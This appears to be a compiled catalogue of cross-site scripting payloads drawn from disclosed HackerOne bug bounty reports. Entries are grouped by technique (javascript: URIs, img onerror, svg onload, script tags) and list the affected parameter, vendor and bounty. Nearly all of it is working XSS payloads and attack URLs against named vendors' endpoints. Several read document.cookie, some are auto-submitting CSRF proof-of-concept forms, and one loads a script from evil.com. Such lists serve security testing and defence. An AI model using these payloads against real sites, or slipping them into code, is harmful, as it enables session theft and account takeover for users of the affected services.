# Cross-site Scripting

804 payloads from disclosed reports.

## Reflected XSS via javascript: URI in referer parameter

### `acfdbb03`

```
https://target.com/creator/auth/login?creator_redirect=javascript:alert(document.domain)
```

**Parameter:** `creator_redirect`
— [Cross-site scripting on target.com](https://hackerone.com/reports/1672459) · Shopify · [kun_19](https://hackerone.com/kun_19) · $1,600.0

### `07dcbe11`

```
https://target.com//x:1/:///%01javascript:alert(document.cookie)/
```

— [\[target.com\] XSS and Open Redirect](https://hackerone.com/reports/260744) · X / xAI · [bobrov](https://hackerone.com/bobrov) · $1,120.0

### `8e4af365`

```
javascript:alert(1)//https://target.com
```

— [Stored XSS in Shopify Chat ](https://hackerone.com/reports/756729) · Shopify · [mosuan](https://hackerone.com/mosuan) · $500.0

### `56e13cfe`

```
referer=javascript:alert(document.cookie);
```

**Parameter:** `referer`
— [\[persistent cross-site scripting\] customers can target admins](https://hackerone.com/reports/55842) · Shopify · [akhil-reni](https://hackerone.com/akhil-reni)

### `3e0da9cd`

```
https://target.com/cart/1188733065:1?channel=buy_button&referer=javascript:alert(document.cookie
```

**Parameter:** `referer`
— [\[persistent cross-site scripting\] customers can target admins](https://hackerone.com/reports/55842) · Shopify · [akhil-reni](https://hackerone.com/akhil-reni)

### `771230f2`

```
javascript:alert(1)
```

**Parameter:** `website`
— [Stored XSS in comments](https://hackerone.com/reports/148751) · Paragon Initiative Enterprises · [kelunik](https://hackerone.com/kelunik)

### `ba4c70d1`

```
javascript:eval%2528unescape%2528location.hash.slice%25281%2529%2529%2529
```

— [Outdated MediaElement.js Reflected Cross-Site Scripting (XSS)](https://hackerone.com/reports/155228) · Eternal · [mrtn](https://hackerone.com/mrtn)

### `abc44652`

```
https://target.com/partners/apex/Cloud_chat?endpoint=javascript:alert(document.domain
```

**Parameter:** `endpoint`
— [\[target.com\] Reflected Cross Site Scripting and Open Redirect](https://hackerone.com/reports/178278) · Informatica · [bogdantc](https://hackerone.com/bogdantc)

### `3194325c`

```
https://target.com/login!input.jspa?referer=javascript:alert(document.domain
```

**Parameter:** `referer`
— [\[target.com\] The login form XSS via the referer value](https://hackerone.com/reports/190016) · Informatica · [s_p_q_r](https://hackerone.com/s_p_q_r)

### `22ebf837`

```
https://target.com/<>javascript:alert(document.cookie);
https://evil.com/<>javascript:alert(document.cookie);
https://evil2.com/<>javascript:alert(document.cookie);
https://target.com/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated&prefv1=<>javascript:alert('xss parameter');
https://target.com/coffee/coffee,de_DE,sc.html?prefn1=<>javascript:alert('xss parameter');
```

— [Open redirect / Reflected XSS payload in root that affects all your sites (store.starbucks.* / shop.starbucks.* / target.com)](https://hackerone.com/reports/196846) · Starbucks · [inhibitor181](https://hackerone.com/inhibitor181)

### `db68c390`

```
%3Ca+href%3D%22%01java%03script%3Aconfirm%28document.domain%29%22%3EClick+to+execute%3Ca%3E%0D%0A
```

— [\[Markdown\] Stored XSS via character encoding parser bypass](https://hackerone.com/reports/270999) · GitLab · [ysx](https://hackerone.com/ysx)

### `1307193a`

```
https://target.com/sankt-peterburg?verifyUserLocation=1#login?next=javascript:alert(
```

**Parameter:** `next`
— [reflected XSS target.com](https://hackerone.com/reports/344429) · Avito · [circuit](https://hackerone.com/circuit)

### `347e1762`

```
https://target.com/account/signin?ReturnUrl=%09Jav%09ascript:alert(document.domain
```

**Parameter:** `ReturnUrl`
— [DOM XSS on target.com via ReturnUrl](https://hackerone.com/reports/526265) · Starbucks · [gamer7112](https://hackerone.com/gamer7112)

### `c122356a`

```
https://████████/en/embeddedAuthRedirect.html?auth=javascript:alert(%22xElkomy%22
```

**Parameter:** `auth`
— [Reflected Xss  https://██████/](https://hackerone.com/reports/759418) · U.S. Dept Of Defense · [0xelkomy](https://hackerone.com/0xelkomy)

### `407a6ff1`

```
https://target.com/docs/new?config={%22account%22:{%22subscription%22:%22javascript:alert(document.domain)//%22},%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
```

**Parameter:** `config`
— [Config override using non-validated query parameter allows at least reflected XSS by injecting configuration into state](https://hackerone.com/reports/1082847) · Superhuman (formerly Grammarly) · [fransrosen](https://hackerone.com/fransrosen)

### `47747f9b`

```
https://target.com/?config={%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
```

**Parameter:** `config`
— [Config override using non-validated query parameter allows at least reflected XSS by injecting configuration into state](https://hackerone.com/reports/1082847) · Superhuman (formerly Grammarly) · [fransrosen](https://hackerone.com/fransrosen)

### `010fbe46`

```
https://target.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22javascript:alert(document.domain)//%22}}
```

**Parameter:** `config`
— [Config override using non-validated query parameter allows at least reflected XSS by injecting configuration into state](https://hackerone.com/reports/1082847) · Superhuman (formerly Grammarly) · [fransrosen](https://hackerone.com/fransrosen)

### `665da331`

```
https://██████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
```

**Parameter:** `sysparm_url`
— [XSS in ServiceNow logout https://████:443](https://hackerone.com/reports/1699855) · U.S. Dept Of Defense · [colemanj](https://hackerone.com/colemanj)

### `960bbb61`

```
https://█████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
```

**Parameter:** `sysparm_url`
— [XSS in ServiceNow logout https://████:443](https://hackerone.com/reports/1699855) · U.S. Dept Of Defense · [colemanj](https://hackerone.com/colemanj)

### `a061d681`

```
https://[YOUR-SHOP].target.com/admin/marketing/reports/[MARKETING-CAMPAIGN-ID]?return_page_pathname=javascript:alert('xss')&return_page_title=Marketing%20overview
```

**Parameter:** `return_page_pathname`
— [Reflected XSS In Marketing Reports Page On *.target.com/admin](https://hackerone.com/reports/1754843) · Shopify · [raymondlind8](https://hackerone.com/raymondlind8)

### `e550652d`

```
https://█████████████████/auth/logout.jsx?home=javascript:(alert(%27XSS%20Success!%27))()
```

**Parameter:** `home`
— [Reflected XSS in ████████████](https://hackerone.com/reports/1882592) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)

### `943d16a6`

```
https://████████████████/auth/logout.jsx?home=javascript:(alert(%27XSS%20Success!%27))()
```

**Parameter:** `home`
— [Reflected XSS in ████████████](https://hackerone.com/reports/1882592) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)

### `159163d1`

```
https://target.com/start/account/user?variationName=free&redirect_to=javascript:alert(document.domain
```

**Parameter:** `redirect_to`
— [reflected xss in https://target.com/start/account/user](https://hackerone.com/reports/2055132) · Automattic · [secureighty](https://hackerone.com/secureighty)

### `3d2567d2`

```
https://target.com/portal/login-callback?redirectUrl=javascript:alert(document.domain
```

**Parameter:** `redirectUrl`
— [ Potential XSS Vulnerability in Acronis Login Callback URL](https://hackerone.com/reports/2611305) · Acronis · [kindone](https://hackerone.com/kindone)


## Reflected XSS via img onerror attribute injection

### `75f151b3`

```
http://172.98.67.89:22057/survey.cgi?iface=%22%3E%3Cimg%20src=x%20onerror=prompt(document.cookie
```

**Parameter:** `iface`
— [Reflected Xss in AirMax \[Nanostation Loco M2\]](https://hackerone.com/reports/149287) · Ubiquiti Inc. · [b7882330c6060c6b277c5a1](https://hackerone.com/b7882330c6060c6b277c5a1)

### `cfdd0b81`

```
https://target.com/product-category/apparel/?subcat=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain
```

**Parameter:** `subcat`
— [DOM Based XSS In target.com](https://hackerone.com/reports/230435) · WordPress · [pabster](https://hackerone.com/pabster)

### `1c187a8a`

```
https://target.com/my_reports/api/v1/document%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie
```

— [XSS Reflected on my_report](https://hackerone.com/reports/491023) · Semrush · [r0hack](https://hackerone.com/r0hack)

### `87d3ea4a`

```
https://target.com/auth?shop=%3C/noscript%3E%3Cimg%20src=x%20onerror=prompt(document.domain
```

**Parameter:** `shop`
— [Reflected XSS ](https://hackerone.com/reports/569241) · Shopify · [0xprial](https://hackerone.com/0xprial)

### `fb8ba839`

```
https://target.com/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(document.domain
```

**Parameter:** `channel`
— [Reflected XSS on https://target.com via 'channel' parameter](https://hackerone.com/reports/659419) · WordPress · [gnux](https://hackerone.com/gnux)

### `8d0e8e6f`

```
"><img src=x onerror=alert(1)><x y="
```

— [XSS on https://target.com/](https://hackerone.com/reports/979204) · Acronis · [yash_](https://hackerone.com/yash_)

### `76db1016`

```
1234567"><img src=a onerror=alert(1)>
```

— [XSS stored in the Shopify Email app](https://hackerone.com/reports/1033882) · Shopify · [tomorrow_future](https://hackerone.com/tomorrow_future)

### `90092d27`

```
"><img src=x onerror=alert(document.cookie);>
```

— [XSS in Email Input \[target.com\]](https://hackerone.com/reports/1037714) · Automattic · [ahmd_halabi](https://hackerone.com/ahmd_halabi)

### `e7f32bea`

```
1-> Visit https://target.com/live/login/?reset=x&username=xss%22%3E%3Cimg+src=x+onerror=alert(document.domain)%3E
```

**Parameter:** `username`
— [\[https://target.com\] - Reflected XSS via username parameter ](https://hackerone.com/reports/1201134) · Recorded Future · [bombon](https://hackerone.com/bombon)

### `10d9938c`

```
<img src%3dx onerror%3dalert(document.cookie>
```

— [Reflected XSS via `████████` parameter](https://hackerone.com/reports/1536215) · U.S. Dept Of Defense · [mdakh404](https://hackerone.com/mdakh404)

### `aced2316`

```
https://target.com/?s=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28document.cookie%29%3E&post_type=knowledgebase
```

**Parameter:** `s`
— [XSS and HTML Injection on the target.com search box](https://hackerone.com/reports/1537149) · Automattic · [sawrav-chowdhury](https://hackerone.com/sawrav-chowdhury)

### `09035fd0`

```
XSS Payload: "><img src=x onerror=javascript:alert(document.cookie)>
```

— [XSS and HTML Injection on the target.com search box](https://hackerone.com/reports/1537149) · Automattic · [sawrav-chowdhury](https://hackerone.com/sawrav-chowdhury)

### `626b6b03`

```
XSS Payload:  "><img src=x onerror=javascript:alert(document.cookie)>
```

— [ Site information's Display Name section vulnerable for XSS attacks and HTML Injections.](https://hackerone.com/reports/1554888) · Automattic · [sawrav-chowdhury](https://hackerone.com/sawrav-chowdhury)

### `7278aa08`

```
\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
```

**Parameter:** `USERNAME`
— [DOM-XSS](https://hackerone.com/reports/1982099) · U.S. Dept Of Defense · [medokll0011](https://hackerone.com/medokll0011)

### `27ffac35`

```
https://target.com/webview/v1/refresh-jwt?redirect=%22%3E%3Cimg%20src=faw%20onerror=alert(1
```

**Parameter:** `redirect`
— [#1 XSS on target.com](https://hackerone.com/reports/2014955) · inDrive · [maxdha](https://hackerone.com/maxdha)

### `f16e3253`

```
id: CVE-2022-35653

info:
  name: Moodle LTI module Reflected - Cross-Site Scripting
  author: iamnoooob,pdresearch
  severity: medium
  description: |
    A reflected XSS issue was identified in the LTI module of Moodle. The vulnerability exists due to insufficient sanitization of user-supplied data in the LTI module. A remote attacker can trick the victim to follow a specially crafted link and execute arbitrary HTML and script code in user's browser in context of vulnerable website to steal po
```

**Parameter:** `body`
— [Reflected XSS via Moodle on ███ \[CVE-2022-35653\]](https://hackerone.com/reports/2444032) · U.S. Dept Of Defense · [maskedpersian](https://hackerone.com/maskedpersian)


## Reflected XSS using an SVG onload attribute injected via the 'where' query parameter.

### `a0f12fbe`

```
https://target.com/php/fb_login_pass_reset?type=%22%3E%3Csvg/onload=alert%28document.domain%29%3E%3Ch1%3EBoooooya!!%3C/h1%3E
```

**Parameter:** `type`
— [Cross Site Scripting - type Patameter](https://hackerone.com/reports/114151) · Eternal · [thsa](https://hackerone.com/thsa)

### `b150db29`

```
select <svg onload=alert(1)>
```

**Parameter:** `thequery`
— [Arbitrary SQL query execution and reflected XSS in the "SQL Query Form"](https://hackerone.com/reports/149279) · ExpressionEngine · [strukt](https://hackerone.com/strukt)

### `bda2ed49`

```
https://target.com/email/unsubscribed?email=email@gmail.com%27%22%3E%3Csvg/onload=alert(document.domain)%3E
```

**Parameter:** `email`
— [Xss on target.com](https://hackerone.com/reports/274868) · Imgur · [madrobot](https://hackerone.com/madrobot)

### `ca197b0d`

```
https://██████████/mission.php?content=crew&flight=DOC&line=Right&missionDate=19-Mar-19&ped=%3Csvg+onload=alert(%27jarvis7%27
```

**Parameter:** `ped`
— [\[███████\] Reflected GET XSS (/mission.php?...&missionDate=*)](https://hackerone.com/reports/648298) · U.S. Dept Of Defense · [jarvis0x1](https://hackerone.com/jarvis0x1)

### `533624b4`

```
https://███████/███████=%22%3E%3Csvg/onload=alert(%22nagli%22)%3E
```

**Parameter:** `sub_div_ofc_sym_cd`
— [Reflected XSS on https://█████████/](https://hackerone.com/reports/1065167) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `7628c1ba`

```
https://███████/█████████=%22%3E%3Csvg/onload=alert(%22nagli%22)%3E
```

**Parameter:** `sub_div_ofc_sym_cd`
— [Reflected XSS on https://█████████/](https://hackerone.com/reports/1065167) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)

### `b585e8c4`

```
2- When browsing here, `                                                                                                                                                                                                                                                                                                                                            ><svg/onload=alert(domain)>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163
```

**Parameter:** `p_title`
— [\[hta3\] Chain of ESI Injection & Reflected XSS leading to Account Takeover on \[███\]](https://hackerone.com/reports/1073780) · U.S. Dept Of Defense · [jr0ch17](https://hackerone.com/jr0ch17)

### `c767d58d`

```
http://███/7/0/33/1d/target.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.location
```

**Parameter:** `where`
— [XSS because of Akamai ARL misconfiguration on ████](https://hackerone.com/reports/1305477) · U.S. Dept Of Defense · [pirneci](https://hackerone.com/pirneci)

### `b7100c48`

```
https://█████/7/0/33/1d/target.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain
```

**Parameter:** `where`
— [Reflected XSS \[██████\]](https://hackerone.com/reports/1309385) · U.S. Dept Of Defense · [fdeleite](https://hackerone.com/fdeleite)

### `cbb66c25`

```
https://███████/7/0/33/1d/target.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain
```

**Parameter:** `where`
— [Reflected XSS \[██████\]](https://hackerone.com/reports/1309386) · U.S. Dept Of Defense · [fdeleite](https://hackerone.com/fdeleite)

### `3056fe84`

```
https://████████/█████████████████=%22%3E%3Csvg/onload=alert(1
```

— [Reflected XSS at https://██████/██████ via "██████" parameter](https://hackerone.com/reports/1457444) · U.S. Dept Of Defense · [pelegn](https://hackerone.com/pelegn)

### `4a631b15`

```
https://████████/████████████████████████=%22%3E%3Csvg/onload=alert(1
```

— [Reflected XSS at https://██████/██████ via "██████" parameter](https://hackerone.com/reports/1457444) · U.S. Dept Of Defense · [pelegn](https://hackerone.com/pelegn)

### `1cb86b89`

```
https://██████████%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
```

— [\[ CVE-2018-1000129 \] RXSS At `https://███████` via the URI](https://hackerone.com/reports/2778412) · U.S. Dept Of Defense · [todayisnew-](https://hackerone.com/todayisnew-)

### `dd92fdd1`

```
https://████████%3Csvg%20onload=alert%28document.cookie%29%3E?mimeType=text/html
```

— [\[ CVE-2018-1000129 \] RXSS At `https://███████` via the URI](https://hackerone.com/reports/2778412) · U.S. Dept Of Defense · [todayisnew-](https://hackerone.com/todayisnew-)


## Reflected XSS via script tag injection

### `bbf8df38`

```
{"action":"mobile","redirect_to":"test\"><script>alert(document.domain)</script>"}
```

**Parameter:** `state`
— [Reflected XSS in OAuth complete endpoints](https://hackerone.com/reports/1502099) · Mattermost · [zerodivisi0n](https://hackerone.com/zerodivisi0n) · $150.0

### `b775a3e5`

```
2- enter this javascript   code    "><script>alert(1);</script>     in  form field
```

— [Cross Site Scripting (Reflected) on https://target.com/dotaznik/roadshow-2020/](https://hackerone.com/reports/1081747) · Acronis · [darkdream](https://hackerone.com/darkdream) · $50.0

### `27fb622b`

```
{"enabled":true,"sid":"bbc661585c424072","url":"target.com","cf":1022963},"queryParams":{"bjbxm</script><script>alert(1)</script>xrii5":"1"}
```

— [SSL-protected Reflected XSS in target.com](https://hackerone.com/reports/296701) · Uber · [gregoryvperry](https://hackerone.com/gregoryvperry)

### `128bfb44`

```
target.com/heh<script>alert(1)
```

— [Stored XSS on target.com](https://hackerone.com/reports/390728) · Nextcloud · [5b66c571](https://hackerone.com/5b66c571)

### `66e202d4`

```
"><script>alert(0);</script>
```

— [\[target.com\] Blind XSS in one of the Admin Dashboard](https://hackerone.com/reports/419731) · Eternal · [sandeep_hodkasia](https://hackerone.com/sandeep_hodkasia)

### `9f4c981d`

```
<script>[...something...]</script>
```

— [HTML injection in https://target.com/index.php?candidate=](https://hackerone.com/reports/601192) · Shopify · [pklfpklf](https://hackerone.com/pklfpklf)

### `69527ec7`

```
</script><script>alert(test)</script>
```

**Parameter:** `rid`
— [rxss at https://target.com page not found via rid parameter](https://hackerone.com/reports/840515) · Clario · [g0dzira](https://hackerone.com/g0dzira)

### `41a61bba`

```
https://target.com/mk/api/send-event?rid=%3C/script%3E%3Cscript%3Ealert(document.cookie
```

**Parameter:** `rid`
— [rxss at https://target.com page not found via rid parameter](https://hackerone.com/reports/840515) · Clario · [g0dzira](https://hackerone.com/g0dzira)

### `cb27e596`

```
http://target.com/admin/userlog-index.php?advertiserId=0&publisherId=0&period_preset=all_events%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E&period_start=&period_end=&setPerPage=10
```

**Parameter:** `period_preset`
— [Reflected XSS on /admin/userlog-index.php](https://hackerone.com/reports/1083231) · Revive Adserver · [solov9ev](https://hackerone.com/solov9ev)

### `a86cc1e6`

```
"/><script>alert(1);</script>
```

— [xss reflected on https://███████- (███ parameters)](https://hackerone.com/reports/1143783) · U.S. Dept Of Defense · [fiveguyslover](https://hackerone.com/fiveguyslover)

### `3b6f0a4f`

```
Address=███████&Address2=█████&AeonForm=Registration&City=██████&Country=████&Department=Candidate&EMailAddress=█████████&FORMSTATE=1&FirstName=ghovjnjv&ID=1&IDType=1&LastName=ghovjnjv&NotificationMethod=Email&Password1=u]H[ww6KrA9F.x-F&Password2=u]H[ww6KrA9F.x-F&Phone=███&SAddress=██████&SAddress2=█████████&SCity=██████&SCountry=AF&SState=N/A&SZip=██████████&State=N/A&Status=USMA&SubmitButton=Submit%20Information&Username=ghovjnjv'"()%26%25<zzz><ScRiPt>alert(233)</ScRiPt>&Zip=██████████
```

**Parameter:** `Username`
— [Parâmetro XSS: Nome de usuário - █████████](https://hackerone.com/reports/2356104) · U.S. Dept Of Defense · [chor4o](https://hackerone.com/chor4o)

### `80f6671d`

```
2. Go to Search Function 
3. Then Insert a Normal XSS payload like ==<script>alert(document.cookie)</script>==The XSS will fireup

████

## Impact

XSS Attacks

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go To
```

**Parameter:** `search`
— [Self XSS](https://hackerone.com/reports/2521186) · U.S. Dept Of Defense · [0xtrav](https://hackerone.com/0xtrav)


## Stored XSS via image onerror payload in hidden form field

### `685e9ab6`

```
"><img src="x onerror=alert(document.cookie)>
```

— [Persistent cross-site scripting (XSS) in map attribution](https://hackerone.com/reports/54327) · Mapbox · [ph3t](https://hackerone.com/ph3t) · $1,000.0

### `72a8f7cd`

```
"><img src=x onerror=alert(4)>
```

— [https://target.com/coach/reports/activity XSS](https://hackerone.com/reports/6409) · Khan Academy · [smiegles](https://hackerone.com/smiegles)

### `ba9260ca`

```
<img src='x' onerror='alert(4)'
```

— [Find, private notes Cross-site scripting.](https://hackerone.com/reports/7917) · Respondly · [smiegles](https://hackerone.com/smiegles)

### `82504332`

```
"><img src=x onerror=alert(document.domain)>
```

**Parameter:** `caption`
— [XSS in target.com](https://hackerone.com/reports/57459) · Shopify · [haxs101](https://hackerone.com/haxs101)

### `f5008bee`

```
">TEST<img src=K onerror=prompt(document.domain)>
```

— [Stored XSS on Add Event in Calendar](https://hackerone.com/reports/300532) · Concrete CMS · [gamliel](https://hackerone.com/gamliel)

### `a18513f8`

```
8. In the **Name** field type something like this: ">TEST<img src=K onerror={here goes mad js code}>
```

— [Stored XSS on Add Event in Calendar](https://hackerone.com/reports/300532) · Concrete CMS · [gamliel](https://hackerone.com/gamliel)

### `69eab6d1`

```
Hi, Admin<img src=K onerror=prompt(document.location) width=1px height=1px>
```

— [Stored XSS on Add Calendar](https://hackerone.com/reports/300571) · Concrete CMS · [gamliel](https://hackerone.com/gamliel)

### `2f634a85`

```
7. In **Calendar Name** type something like: **TEST<img src=K onerror={here goes js payload}>**
```

— [Stored XSS on Add Calendar](https://hackerone.com/reports/300571) · Concrete CMS · [gamliel](https://hackerone.com/gamliel)

### `f5b08d2f`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="████████" method="POST">
      <input type="hidden" name="data&#91;account&#93;&#91;addedon&#93;" value="2022&#45;11&#45;22&#32;00&#58;51&#58;28" />
      <input type="hidden" name="data&#91;account&#93;&#91;confirmcode&#93;" value="ydtgsonuk4xk" />
      <input type="hidden" name="data&#91;account&#93;&#91;confirmed&#93;" value="0" />
      <input type="hidden" name="data&#91;account&#93;&#91;descriptio
```

**Parameter:** `data[account][id]`
— [POST XSS - data\[account\]\[id\] parameter](https://hackerone.com/reports/3127147) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)

### `90cbc753`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="████" method="POST">
      <input type="hidden" name="data&#91;account&#93;&#91;addedon&#93;" value="2022&#45;11&#45;22&#32;00&#58;51&#58;28" />
      <input type="hidden" name="data&#91;account&#93;&#91;confirmcode&#93;" value="ydtgsonuk4xk" />
      <input type="hidden" name="data&#91;account&#93;&#91;confirmed&#93;" value="0" />
      <input type="hidden" name="data&#91;account&#93;&#91;description&#9
```

**Parameter:** `data[account][type]`
— [POST XSS -  data\[type\] parameter](https://hackerone.com/reports/3127154) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)

### `462ce7d1`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="████████" method="POST">
      <input type="hidden" name="fields&#91;account&#93;&#91;firstname&#93;" value="fnfOzvSR&lt;img&#32;src&#61;x&#32;onerror&#61;prompt&#40;1&#41;&gt;" />
      <input type="hidden" name="fields&#91;account&#93;&#91;lastname&#93;" value="fnfOzvSR" />
      <input type="hidden" name="fields&#91;contacts&#93;&#91;email&#93;" value="testing&#64;example&#46;com" />
      <input type
```

**Parameter:** `fields[account][firstname]`
— [POST XSS -  fields\[account\]\[firstname\] parameter](https://hackerone.com/reports/3127158) · U.S. Dept Of Defense · [jonasdiasrebelo](https://hackerone.com/jonasdiasrebelo)

### `7e1529b8`

```
<img/src=x onerror=alert(document.domain)>
```

**Parameter:** `nameserver`
— [Stored XSS in nameserver field on account settings page](https://hackerone.com/reports/3644182) · Tucows (VDP) · [axolot23](https://hackerone.com/axolot23)


## Stored XSS via SVG onload attribute injection in the 'name' parameter

### `f68ae39d`

```
4- So change the any member name with hunter"><svg/onload=alert(2)>
```

**Parameter:** `member_name`
— [Stored XSS on activity](https://hackerone.com/reports/391390) · Shopify · [shazadsadiq](https://hackerone.com/shazadsadiq) · $2,000.0

### `250b2621`

```
POST /api/patchPaymentMethod/ID HTTP/2
…

{
  "ipAddress": "<svg on onload=(alert)(document.domain)>",
  "callBackURL": "dssdsd"
}
```

**Parameter:** `ipAddress`
— [Stored xss at https://█.target.com/api/█/ID](https://hackerone.com/reports/2078490) · 8x8 · [pentestor](https://hackerone.com/pentestor) · $1,337.0

### `53980bb8`

```
5. Name the plan with this payload "/><svg/onload=prompt(document.domain)>
```

— [Stored XSS in backup scanning plan name](https://hackerone.com/reports/961046) · Acronis · [sbakhour](https://hackerone.com/sbakhour) · $500.0

### `46ddde23`

```
12. Select the plan create with the payload "/><svg/onload=prompt(document.domain)>
```

— [Stored XSS in backup scanning plan name](https://hackerone.com/reports/961046) · Acronis · [sbakhour](https://hackerone.com/sbakhour) · $500.0

### `97e278d8`

```
{"colours":{},"pd2":{"cranium":"cranium_midstraightmale","forehead":"forehead_standard","hair_back":"hair_back_midstraightmale","hair_front":"hair_front_midstraightmale","hairbottom":"hairbottom_blank","detail_L2_L":"_blank","detail_L2_R":"_blank","jaw":"<svg onload=alert(document.domain)>","beard":"_blank","stachin":"_blank","stachout":"_blank"},"body":{},"style":1}
```

**Parameter:** `jaw`
— [\[target.com\] Stored XSS via an incorrect avatar property value](https://hackerone.com/reports/159878) · Snapchat · [s_p_q_r](https://hackerone.com/s_p_q_r) · $400.0

### `9214d45d`

```
<svg onload=alert(document.domain)>
```

**Parameter:** `app_name`
— [DOMXSS in Tweetdeck](https://hackerone.com/reports/119471) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)

### `92ae0210`

```
"><svg/onload=confirm(document.domain)>
```

**Parameter:** `name`
— [Stored XSS in Express Objects - Concrete5 v8.1.0](https://hackerone.com/reports/221325) · Concrete CMS · [cdl](https://hackerone.com/cdl)

### `e3da1632`

```
<svg/onload=confirm(document.domain)>
```

**Parameter:** `name`
— [Stored XSS in Express Objects - Concrete5 v8.1.0](https://hackerone.com/reports/221325) · Concrete CMS · [cdl](https://hackerone.com/cdl)

### `2206ff5e`

```
[wpvideo%20w0MiG12Exx1\"><svg/onload=prompt(document.domain)>]
```

**Parameter:** `media[23168664]`
— [Stored XSS on target.com + evil.com via Embed Media](https://hackerone.com/reports/920005) · Automattic · [ali](https://hackerone.com/ali)

### `eac45cc9`

```
<form action=https://target.com/en-us/my/remind/index.html method=POST><input type=hidden name="token" value="a016902ceaeb6ae91c21302631fbbcfc"><input type=hidden name="SN" value="818198181891891981981981516518198198"><input type=hidden name="OrderId" value=""><input type=hidden name="Submit" value="Send+E-mail%0D%0A"><input type=hidden name="c" value="1&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(document.cookie)&lt;!--"><input type=submit value=XSS-Acronis></form>
```

— [CSRF and XSS on target.com](https://hackerone.com/reports/961787) · Acronis · [cabelo](https://hackerone.com/cabelo)

### `4bc9a48a`

```
<svg/onload=confirm(document.cookie)>
```

— [Stored XSS at https://█████](https://hackerone.com/reports/1620247) · U.S. Dept Of Defense · [k0shane](https://hackerone.com/k0shane)

### `0cc2308b`

```
svg/onload=alert(1)>
```

— [STORED XSS in █████████/nlc/login.aspx via "edit" GET parameter through markdown editor \[HtUS\]](https://hackerone.com/reports/1631447) · U.S. Dept Of Defense · [shreky](https://hackerone.com/shreky)


## Reflected XSS by injecting a <script> tag as the paste ID in the URL

### `d4828655`

```
https://target.com/careers?lever-#aaa"><script src="https://evil.com/index.php/form/getForm?callback=alert"></script>
```

**Parameter:** `lever`
— [Cross-site Scripting (XSS) on HackerOne careers page](https://hackerone.com/reports/474656) · HackerOne · [nguyenlv7](https://hackerone.com/nguyenlv7) · $500.0

### `1ce2843f`

```
review=140 characters long review&
review_db=140 characters long review&
with_tags_data=<script>prompt(0,document.domain)</script>&
res_id=19132208&
city_id=11333&
rating=5&
is_edit=0&
review_id=0&
save_image=1&
instagram_images_to_update=[]&
instagram_json_data={"data":[]}&
uploaded_images_json=[]&
share_to_fb=false&
share_to_tw=false&
snippet=restaurant-review&
web_source=default&
csrf_token=2acad4ba08d4000000000007923a25d&
external_url=
```

**Parameter:** `with_tags_data`
— [Self-Stored XSS - Chained with login/logout CSRF](https://hackerone.com/reports/632017) · Eternal · [madguyyy](https://hackerone.com/madguyyy) · $300.0

### `38c1c468`

```
https://target.com/landings/123.1/index.php?affid=zzb_175.331184.1530814850.33.zzb&trt=29_5tse3g%22%3E%3Cscript%3Ealert(document.domain
```

**Parameter:** `trt`
— [RXSS on /landings/123.1/index.php (target.com)](https://hackerone.com/reports/732394) · Clario · [sec0ndw0lf](https://hackerone.com/sec0ndw0lf) · $300.0

### `7ea34b9f`

```
<script>
location="https://target.com/search?q=</title><h1><marquee><s>Injection<!--"
</script>
```

— [\[Android\] HTML Injection in BatterySaveArticleRenderer WebView](https://hackerone.com/reports/176065) · Brave Software · [bobrov](https://hackerone.com/bobrov) · $150.0

### `beff35fd`

```
<script>
```

— [Reflected XSS in Pastebin-view](https://hackerone.com/reports/17540) · IRCCloud · [pseudochu](https://hackerone.com/pseudochu)

### `ebcf4112`

```
- Logon to [target.com/careers/list/?city=...](                                                        ><script>alert('xss by pavanw3b')<%2fscript>fupaiiz&country=all&keywords=&subteam=all&team=all) on firefox.
```

**Parameter:** `city`
— [Reflected XSS on target.com careers](https://hackerone.com/reports/117190) · Uber · [pavanw3b](https://hackerone.com/pavanw3b)

### `158df9c6`

```
something<script>alert('xss');</script>
```

**Parameter:** `dbName`
— [Reflected XSS in Step 2 of the Installation](https://hackerone.com/reports/170156) · Revive Adserver · [pavanw3b](https://hackerone.com/pavanw3b)

### `ca97bbce`

```
<script type='text/javascript'>
/* <![CDATA[ */
var actionbardata = {
...
"subscribeNonce":"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"9dca8606d3\" \/><input type=\"hidden\" name=\"_wp_http_referer\" 
value=\"\/support\/\"><script>alert(document.domain)<\/script>\" \/>",
"referer":"https:\/\/target.com\/support\/\"><script>alert(document.domain)<\/script>",
"canFollow":"1"
...
</script>
```

**Parameter:** `referer`
— [Follow Button XSS](https://hackerone.com/reports/172574) · Automattic · [bobrov](https://hackerone.com/bobrov)

### `6ddcee72`

```
